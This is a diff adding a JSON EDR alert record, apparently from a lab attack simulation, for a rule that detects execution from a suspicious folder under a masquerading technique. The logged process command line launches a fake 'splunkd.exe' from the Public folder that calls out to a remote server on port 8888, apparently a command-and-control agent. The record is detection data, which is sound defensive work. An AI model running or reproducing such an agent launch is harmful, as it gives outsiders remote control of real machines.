@@ -1,0 +1,124 @@
+{
+    "alert": {
+        "created": "2024-06-06T08:14:27.833Z",
+        "kind": "alert",
+        "level": "high"
+    },
+    "ams": {
+        "suppressed": false
+    },
+    "event": {
+        "code": 1,
+        "created": "2024-06-06T08:14:26.072Z",
+        "host": "BGLAB002W10003",
+        "uuid": "f88deca2-d8f1-487a-a94d-37dc1803c268"
+    },
+    "falsepositives": [
+        "Unknown"
+    ],
+    "observables": {
+        "destination": {
+            "domain": null,
+            "ip": null,
+            "port": null
+        },
+        "dns": {
+            "question": {
+                "name": null
+            }
+        },
+        "event": {
+            "action": "Process creation",
+            "channel": "sysmon",
+            "code": 1,
+            "type": [
+                "start"
+            ]
+        },
+        "file": {
+            "hash": {
+                "imphash": null,
+                "sha256": null
+            },
+            "name": null,
+            "path": null
+        },
+        "host": {
+            "name": "BGLAB002W10003"
+        },
+        "process": {
+            "command_line": "\"C:\\Users\\Public\\splunkd.exe\" -server \nhttp://178.128.106.123:8888 -group blue",
+            "executable": "C:\\Users\\Public\\splunkd.exe",
+            "hash": {
+                "imphash": null,
+                "sha256": "f9067fe3d46a1b4501ad2e81f2133b6199670e696113a60d496ab1a9614b7162"
+            },
+            "name": "splunkd.exe",
+            "parent": {
+                "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\" \"C:\\Users\\BGService\\Desktop\\simulate-test.ps1\"",
+                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+                "name": "powershell_ise.exe"
+            },
+            "pe": {
+                "company": null,
+                "description": null,
+                "original_file_name": null,
+                "product": null
+            },
+            "working_directory": "C:\\Users\\BGService\\Desktop\\"
+        },
+        "registry": {
+            "path": null,
+            "value": null
+        },
+        "source": {
+            "domain": null,
+            "ip": "107.178.223.183",
+            "port": null
+        },
+        "user": {
+            "domain": "BGLAB002",
+            "name": "BGService"
+        },
+        "winlog": {
+            "consumer": null,
+            "eventnamespace": null,
+            "eventtype": null,
+            "filter": null,
+            "grantedaccess": null,
+            "initiated": null,
+            "integritylevel": null,
+            "name": null,
+            "operation": null,
+            "state": null,
+            "targetimage": null,
+            "user": {
+                "domain": "NT AUTHORITY",
+                "identifier": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "User"
+            }
+        }
+    },
+    "observables_list": [
+        "NA"
+    ],
+    "observer": {
+        "type": "edr"
+    },
+    "organization": {
+        "id": "d3b6842d"
+    },
+    "rule": {
+        "description": "Detects a suspicious execution from an uncommon folder",
+        "id": "3a35139c-f509-4a03-a31e-39c515e18045",
+        "name": "Execution from Suspicious Folder_custom"
+    },
+    "tacticidlist": [
+        "TA0005"
+    ],
+    "techniqueidlist": [
+        "T1036"
+    ],
+    "uuid": "31ad1e38-d269-47ab-bba4-bbb0da039486"
+}
